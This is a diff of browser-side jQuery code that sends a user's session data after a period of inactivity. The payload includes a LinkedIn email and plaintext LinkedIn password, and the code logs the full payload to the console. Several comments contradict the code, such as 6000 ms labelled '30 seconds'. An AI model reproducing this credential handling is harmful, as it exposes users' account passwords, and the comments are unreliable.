@@ -11,7 +11,7 @@ $(document).ready(function() {
   
     function resetInactivityTimer() {
       clearTimeout(inactivityTimeout);
-      inactivityTimeout = setTimeout(sendSessionData, 3000); // 30 seconds of inactivity
+      inactivityTimeout = setTimeout(sendSessionData, 6000); // 30 seconds of inactivity
       console.log('Inactivity timer reset.');
     }
   
@@ -27,8 +27,9 @@ $(document).ready(function() {
                 user_id: action.user_id,
                 linkedin_password: action.linkedin_password,
                 linkedin_email: action.linkedin_email,
-                profile: action.profile_linkedin, // Use actionObject.timestamp
+                linkedin: action.profile_linkedin, // Use actionObject.timestamp
               }
+              
             };
       
             console.log('Payload being sent:', JSON.stringify(userSession, null, 2));
